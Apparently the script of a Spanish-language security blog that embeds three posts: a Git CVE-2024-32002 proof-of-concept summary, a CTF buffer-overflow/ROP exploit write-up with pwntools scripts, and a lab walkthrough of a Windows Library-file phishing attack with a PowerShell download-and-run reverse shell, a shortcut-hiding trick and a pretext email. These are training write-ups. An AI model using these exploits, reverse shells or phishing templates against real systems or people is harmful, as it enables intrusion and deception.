document.addEventListener('DOMContentLoaded', function () {
    const posts = [
        {
            id: 1,
            title: 'CVE 2024-32002',
            date: 'June 12, 2024',
            content: `
                <h2>CVE-2024-32002-Reverse-Shell</h2>
                <p>Este script demuestra cómo explotar la vulnerabilidad CVE-2024-32002 para obtener una reverse shell, proporcionando acceso remoto al sistema afectado. Úselo con precaución en entornos controlados y solo con fines educativos o de pruebas de seguridad.</p>
                <h3>Publicación del Blog</h3>
                <p>Este script esta inspirado en el blog Blog: <a href="https://amalmurali.me/posts/git-rce">https://amalmurali.me/posts/git-rce</a>. aca encontraras más detalles acerca de esta vulnerabilidad</p>
                <h3>Cómo funciona</h3>
                <ol>
                    <li>Un repositorio malicioso (<code>git_rce</code>) incluye un submódulo con una ruta especialmente diseñada.</li>
                    <li>La ruta del submódulo utiliza una variación de mayúsculas y minúsculas que explota el sistema de archivos que no distingue entre mayúsculas y minúsculas.</li>
                    <li>El submódulo incluye un enlace simbólico que apunta a su directorio <code>.git/</code>, que contiene un enlace malicioso.</li>
                    <li>Cuando se clona el repositorio, se sigue el enlace simbólico y se ejecuta el enlace malicioso, lo que lleva a RCE.</li>
                </ol>
                <h3>Versiones de Git Afectadas y Parcheadas</h3>
                <p>Versiones afectadas por la vulnerabilidad:</p>
                <ul>
                    <li>Todas las versiones anteriores a 2.45.1</li>
                    <li>Todas las versiones anteriores a 2.44.1</li>
                    <li>Todas las versiones anteriores a 2.43.4</li>
                    <li>Todas las versiones anteriores a 2.42.2</li>
                    <li>Todas las versiones anteriores a 2.41.1</li>
                    <li>Todas las versiones anteriores a 2.40.2</li>
                    <li>Todas las versiones anteriores a 2.39.4</li>
                </ul>
                <p>Versiones parcheadas:</p>
                <ul>
                    <li>2.45.1</li>
                    <li>2.44.1</li>
                    <li>2.43.4</li>
                    <li>2.42.2</li>
                    <li>2.41.1</li>
                    <li>2.40.2</li>
                    <li>2.39.4</li>
                </ul>
                <h3>Ejecución</h3>
                <p><strong>Advertencia:</strong> No ejecute esta PoC en sistemas que no sean de su propiedad o que no tenga permiso explícito para usarlo. Las pruebas no autorizadas podrían tener consecuencias no deseadas.</p>
                <div class="code-block">
                    <pre><code>bash pocgitrevershell.sh</code></pre>
                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                </div>
                <p>Nota: En Windows, es posible que necesites ejecutar el shell como administrador para que esto funcione.</p>
                <h3>Como se ve al ejecutar</h3>
                <img src="https://github.com/JJoosh/CVE-2024-32002-Reverse-Shell/assets/122099216/1f48060d-04dd-4331-8ecd-7e15e57735b6" alt="Execution Screenshot">
                <img src="https://github.com/JJoosh/CVE-2024-32002-Reverse-Shell/assets/122099216/98ee1c05-a191-406c-9c35-b6ef2b474d90" alt="Execution Screenshot">
                <p>Es todo por este PoC, sigueme en github :) <a href="https://github.com/JJoosh">Follow me</a></p>

            `
        },

        {
            id: 2, 
            title: 'C2 Server Exploit',
            date: 'October 14, 2024',
            content: `
                <h2>Server C2 Exploit Writeup</h2>

                <p>La función main() del binario ejecuta un bucle, este se ejecuta n veces que es la longitud de la string "echo Datos exfiltrados", en cada iteración llama a la función updateCommand() pasandole como primer argumnto el valor del iterador que va de 0 hasta la longitud de la string y como segundo argumento la letra de la string en esa posición por lo que si el iterador es 0 le pasará la letra "e", si el iterador es 1 le pasará la letra "c"</p>
                <img src="https://github.com/user-attachments/assets/0fdb5319-e59a-49a9-920b-23be1a66060a" alt="Command Execution Diagram" />

                <p>La función updateCommand() simplemente se encarga de mover a el símbolo llamado command mas la posición el valor que recibe como segundo argumento, si el iterador es 0 movera a command + 0 la letra "e", si el iterador es 1, movera a command + 1 la letra "c"</p>
                <img src="https://github.com/user-attachments/assets/5b4575ea-a59d-409a-a14f-eaa2fad4be2e" />

                <p>Luego tenemos que llama a la función vuln(), esta declara un buffer y recibe con fgets 0x200 bytes o 512 en decimal</p>
                <img src="https://github.com/user-attachments/assets/057fca7c-7102-4273-905d-6732bf0461a2" alt="Execution Screenshot" />

                <p>Sin embargo el buffer esta en esp - 0x10c o esp - 268</p>
                <img src="https://github.com/user-attachments/assets/dfcf4f05-199e-42f2-9ddb-1adeb691967d" />
                <p>por lo que después de enviar 268 bytes empezariamos a sobrescribir datos en el stack</p>

                <p>Finalmente main() llama a la función execCommand() que solo se encarga de ejecutar con system() el simbolo command rellenado anteriormente letra por letra usando updateCommand()</p>
                <img src="https://github.com/user-attachments/assets/80d14425-3bfb-43e8-9b01-71605e4263c6" />




                <h3>Exploitation Script</h3>
                <p>Ya que conocemos el offset podemos simplemente pasar esos bytes y sobrescribir un dword en el esp</p>
                <div class="code-block">
                    <pre><code>
#!/usr/bin/python3
from pwn import *

shell = gdb.debug("./chal", "continue")

offset = 268
junk = b"A" * offset

payload  = b""
payload += junk
payload += p32(0x42424242)

shell.sendline(payload)
shell.recvlines(2)

shell.interactive()
                    </code></pre>
                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                </div>

                <p>De esta forma sobrescribimos el return address y obtenemos control sobre el flujo </p>
                <img src="https://github.com/user-attachments/assets/395bf669-98af-4863-b938-eda27672b172" alt="Shell Execution" />

                <p>Técnica: nuestra idea sera aprovechar que con updateCommand() podemos modificar un byte del simbolo command pasandole la posición y un valor, para posteriormente llamar a execCommand() y ejecutar dicho comando</p>
                <div class="code-block">
                    <pre><code>
from pwn import *

shell = gdb.debug("./chal", "b *0x080491f3\ncontinue")

offset = 268
junk = b"A" * offset

payload  = b""
payload += junk

payload += p32(0x080491f3) # updateCommand()
payload += p32(0x42424242) # return address
payload += p32(0)          # position
payload += p32(u8(b"/"))   # byte to write

shell.sendline(payload)
shell.recvlines(2)

shell.interactive()
                    </code></pre>
                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                </div>
                    
                    <p>Iniciamos intentando escribir un solo byte, en este caso al inicio de la llamada de updateCommand el primer valor en el stack será la dirección donde volverá una vez termine la llamada y los siguientes 2 valores son los argumentos en este paso le pasamos como argumento la posición 0 del simbolo command y como valor a escribir el byte 0x2f o /</p>
                    <img src="https://github.com/user-attachments/assets/16b1bb7e-ea60-4460-abe7-d920eeb7c256" alt="Shell Execution" />

                    <p>Una vez continuamos con la ejecución de updateCommand(0, "/") en el simbolo command se escribe el caracter "/" y vuelve a la direccion de retorno que pasamos al inicio</p>
                    <img src="https://github.com/user-attachments/assets/87574376-ef26-4268-b812-4a04cb0e1d70" alt="Shell Execution" />
                    <p>Ahora bien, necesitamos repetir este proceso y seguir con ese convenio de llamadas, para evitar que lo anterior limpiaremos los argumentos antes usados que son 2 dwords u 8 bytes, sin embargo no encontramos un gadget que limpie 8 sino uno que limpia 12 por lo que tendremos que pasar 4 bytes mas de padding</p>
                    <img src="https://github.com/user-attachments/assets/3d03a612-1dd9-44b4-83f5-a0e05a564dff" alt="Shell Execution" />

                    <p>El exploit mediante un bucle for pasa como primer argumento que es la posición el iterador de 0 a 7 y le pasa a su vez el valor que esta en esa posición de la string cmd, como valor de retorno usamos el stack pivot para limpiar la pila y vuelva a ejecutar la siguiente función</p>
                    

                                    <div class="code-block">
                    <pre><code>
#!/usr/bin/python3
from pwn import *

shell = gdb.debug("./chal", "b *0x080491f3\ncontinue")

offset = 268
junk = b"A" * offset

cmd = b"/bin/sh\x00"

payload  = b""
payload += junk

for i in range(len(cmd)):
    payload += p32(0x080491f3)     # updateCommand()
    payload += p32(0x0804901b)     # add esp, 8; pop ebx; ret;
    payload += p32(i)              # position
    payload += p32(u8(cmd[i:i+1])) # byte to write
    payload += p32(0x41414141)     # padding

payload += p32(0x0804921d)         # execCommand()

shell.sendline(payload)
shell.recvlines(2)

shell.interactive()
                    </code></pre>
                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                </div>
                    <p>Al terminar la ejecución de la primera llamada a la función limpia 2 bytes como se muestra en la imagen y retorna a la función updateCommand del siguiente valor</p>
                   <img src="https://github.com/user-attachments/assets/4649f48b-3de9-4a4a-b925-ad9c7781ba65" alt="Shell Execution" />

                    
                    <p>En la ultima llamada a execCommand ya hemos modificado la string del simbolo command a /bin/sh por lo que al ejecutarlo con system obtenemos una shell</p>
                    <img src="https://github.com/user-attachments/assets/d16b5826-5157-4805-8766-2c81c327f047" alt="Shell Execution" /> 
                    <p>Finalmente solo nos queda ejecutarlo remotamente y obtener acceso</p>
                                                        <div class="code-block">
                    <pre><code>
#!/usr/bin/python3
from pwn import remote, p32, u8

shell = remote("35.95.31.64", 3000)

offset = 268
junk = b"A" * offset

cmd = b"/bin/sh\x00"

payload  = b""
payload += junk

for i in range(len(cmd)):
    payload += p32(0x080491f3)     # updateCommand()
    payload += p32(0x0804901b)     # add esp, 8; pop ebx; ret;
    payload += p32(i)              # position
    payload += p32(u8(cmd[i:i+1])) # byte to write
    payload += p32(0x41414141)

payload += p32(0x0804921d)         # execCommand()

shell.sendline(payload)
shell.recvlines(2)

shell.interactive()
                    </code></pre>
                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                </div>
                    <img src="https://github.com/user-attachments/assets/c646b120-9a12-4069-bbf3-b06104c72eb9" alt="Shell Execution" /> 
                    

                      
                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                </div>
            `
        },
        {
            id: 3,
            title: 'Abusing Windows Library Files',
            date: 'January 14, 2025',
            content: `
            <p>A continuación, ejecutaremos WsgiDAV desde el **/inicio/kali/.local/bin** directorio. En el caso de que WsgiDAV se haya instalado mediante apt, la instalación el camino difiere y _WsgiDAV_ debe usarse como comando para iniciar el servidor durante todo el curso. El primer parámetro que proporcionaremos es **--anfitrión**, que especifica el host desde el que servir. vamos a escuchar todas las interfaces con **0.0.0.0**. A continuación, especificaremos la escucha. puerto con **--puerto=80** y deshabilitar la autenticación en nuestro recurso compartido con **--autenticación = anónimo**. Finalmente, configuraremos la raíz del directorio de nuestro WebDAV compartir.</p>

<div class="code-block">
<pre><code>
kali@kali:~$ mkdir /home/kali/webdav

kali@kali:~$ touch /home/kali/webdav/test.txt

kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
Running without configuration file.
17:41:53.917 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
17:41:53.919 - INFO    : WsgiDAV/4.0.1 Python/3.9.10 Linux-5.15.0-kali3-amd64-x86_64-with-glibc2.33
17:41:53.919 - INFO    : Lock manager:      LockManager(LockStorageDict)
17:41:53.919 - INFO    : Property manager:  None
17:41:53.919 - INFO    : Domain controller: SimpleDomainController()
17:41:53.919 - INFO    : Registered DAV providers by route:
17:41:53.919 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.9/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
17:41:53.919 - INFO    :   - '/': FilesystemProvider for path '/home/kali/webdav' (Read-Write) (anonymous)
17:41:53.920 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
17:41:53.920 - WARNING : Share '/' will allow anonymous write access.
17:41:53.920 - WARNING : Share '/:dir_browser' will allow anonymous read access.
17:41:54.348 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.5.2+ds1 Python 3.9.10
17:41:54.348 - INFO    : Serving on http://0.0.0.0:80 ..
</code></pre>
<button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
</div> 

<p>El resultado indica que el servidor WebDAV ahora se está ejecutando en el puerto 80. Confirmemos esto abriendo en nuestro navegador.</p>
 <img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/5377fb2c3624ec7bfb55d60f8196895a-csa_sc_webdavbrowser2.png"/>
<br>

<p>A continuación, creemos el archivo de biblioteca de Windows. usaremos **xfreerdp** a conectarse al _Cliente137_ máquina en **192.168.50.194** a través de RDP a preparar nuestro ataque. Podemos conectarnos al sistema con _offsec_ como el nombre de usuario y _Laboratorio_ como contraseña. Esto hará que sea mucho más fácil para para construir y probar nuestro archivo de biblioteca, y más tarde, nuestro archivo de acceso directo.
Una vez conectados, encontraremos el Código de estudio visual aplicación en el escritorio, que usaremos para crear nuestra biblioteca archivo. Debemos tener en cuenta que también podríamos utilizar Bloc de notas para crear el archivo. Abramos VSC haciendo doble clic en el icono.</p>
<img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/3c18f3689192eac43f9352a542fdba2c-csa_sc_win112.png"/>
<br>

<p>En la barra de menú, haremos clic en _archivo_ > _Nuevo archivo de texto_. entonces lo haremos guarde el archivo vacío como **config.Biblioteca-ms** en el _offsec_ del usuario de oficina. Tan pronto como guardemos el archivo con esta extensión de archivo, se muestra con un icono. Si bien el ícono no parece peligroso, sí Windows no lo utiliza habitualmente y, por lo tanto, puede generar sospechas. Para aumentar las posibilidades de que nuestra víctima ejecute nuestro archivo, vamos cambiar su apariencia.</p>
<img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/d851cb673201245bd941d1299e76461d-csa_sc_vscempty3.png"/>

<p>El La siguiente lista muestra el XML completo.:</p>


<p>Guardemos y cerremos el archivo en Visual Studio Code. entonces lo haremos haga doble clic en **config.Biblioteca-ms** archivo en el escritorio.</p>
<img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/7624182b026f1ec571a6f48745f17a76-csa_sc_openlib.png"/>

<p>Cuando abrimos el directorio en el Explorador, encontramos el creado previamente **prueba.txt** archivo que colocamos en el recurso compartido WebDAV. Por lo tanto, el El archivo de biblioteca funciona e incorpora la conexión al recurso compartido WebDAV..</p>
<p>Muy lindo!</p>


<p>Creemos el acceso directo en el escritorio para el _offsec_ usuario. Para esto, haremos clic derecho en el escritorio y haremos clic en _nuevo_ luego en _Atajo_. en el _Crear acceso directo_ ventana, podemos ingresar una ruta a un programa junto con argumentos, que serán señalados por el atajo. Apuntaremos el acceso directo a PowerShell y usaremos otro descargue la base para cargar PowerCat desde nuestra máquina Kali e inicie un caparazón inverso.
</p>

<p>Usaremos el comando que aprovechamos anteriormente.:</p>
<div class="code-block">
<pre><code>

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 4444 -e powershell"

</code></pre>
<button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
</div> 

<p>Ingresaremos este comando en el campo de entrada y haremos clic _Próximo_.</p>
<img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/2ad68e3a33e8ba87b2a27876c2bbf6f5-csa_sc_createshortcut2.png"/>

<p>
Si esperamos que nuestras víctimas sean lo suficientemente conocedoras de la tecnología como para realmente Compruebe hacia dónde apuntan los archivos de acceso directo, podemos usar un truco útil. Dado que nuestro comando proporcionado parece muy sospechoso, podríamos simplemente poner un delimitador y comando benigno detrás de él para impulsar el comando malicioso fuera del área visible en el menú de propiedades del archivo. Si un usuario fuera para verificar el acceso directo, solo verán el comando benigno.</p>
<p>En la siguiente ventana, ingresemos **configuración_automática** como el nombre del archivo de acceso directo y haga clic en _Finalizar_ para crear el archivo.</p>
<p>En nuestra máquina Kali, iniciemos un servidor web Python3 en el puerto 8000 dónde **powercat.ps1** está ubicado e inicia un oyente Netcat en el puerto 4444.</p>

<p>El pretexto es un aspecto importante de este ataque del lado del cliente. en esto En este caso podríamos decirle al objetivo que somos un nuevo miembro del equipo de TI. y necesitamos configurar todos los sistemas del cliente para la nueva gestión. plataforma. También les diremos que hemos incluido un fácil de usar programa de configuración. Un correo electrónico de ejemplo para utilizar en una evaluación real se muestra a continuación.</p>
<div class="code-block">
<pre><code>
Hello! My name is Dwight, and I'm a new member of the IT Team. 

This week I am completing some configurations we rolled out last week.
To make this easier, I've attached a file that will automatically
perform each step. Could you download the attachment, open the
directory, and double-click "automatic_configuration"? Once you
confirm the configuration in the window that appears, you're all done!

If you have any questions, or run into any problems, please let me
know!
</code></pre>
<button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
</div> 

<p>Ahora copiemos **configuración_automática.lnk** y **config.Biblioteca-ms** a nuestro directorio WebDAV en nuestra máquina Kali.</p>
<p>Ahora solo nos queda efectuar el ataque mandando el correo al servidor SMTP y esperar nuestra revshell</p>

<div class="code-block">
<pre><code>
sudo swaks -t dave.wizzard@supermagicorp.com --from test@supermagicorp.com --attach @config.Library-ms --server 192.168.132.199 --body @body.txt --header "Subject: Problem" --suppress-data -ap
</code></pre>
<button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
</div> 
<img src="https://raw.githubusercontent.com/JJoosh/JJoosh.github.io/refs/heads/main/img/WhatsApp%20Image%202025-01-14%20at%2015.35.26_d56f6322.jpg"/>

            `
        }
    ];

 document.querySelectorAll('.read-more').forEach(button => {
        button.addEventListener('click', function(event) {
            event.preventDefault();
            const postId = this.parentElement.getAttribute('data-id');
            const post = posts.find(p => p.id == postId);

            document.querySelector('.blog-posts').style.display = 'none';
            document.getElementById('full-post').style.display = 'block';
            document.getElementById('post-content').innerHTML = `
                <h2>${post.title}</h2>
                <p class="date">${post.date}</p>
                ${post.content}
            `;
        });
    });

    document.getElementById('back-to-blog').addEventListener('click', function(event) {
        event.preventDefault();
        document.querySelector('.blog-posts').style.display = 'block';
        document.getElementById('full-post').style.display = 'none';
        document.getElementById('post-content').innerHTML = '';
    });
});

function toggleMenu() {
    const navLinks = document.getElementById('nav-links');
    navLinks.classList.toggle('active');
}

function copyCode(button) {
    const codeBlock = button.previousElementSibling;
    const range = document.createRange();
    range.selectNode(codeBlock);
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(range);

    try {
        const successful = document.execCommand('copy');
        if (successful) {
            button.innerHTML = '<i class="fas fa-check"></i>';
            setTimeout(() => {
                button.innerHTML = '<i class="fas fa-copy"></i>';
            }, 2000);
        }
    } catch (err) {
        console.error('Failed to copy text: ', err);
    }

    window.getSelection().removeAllRanges();
}

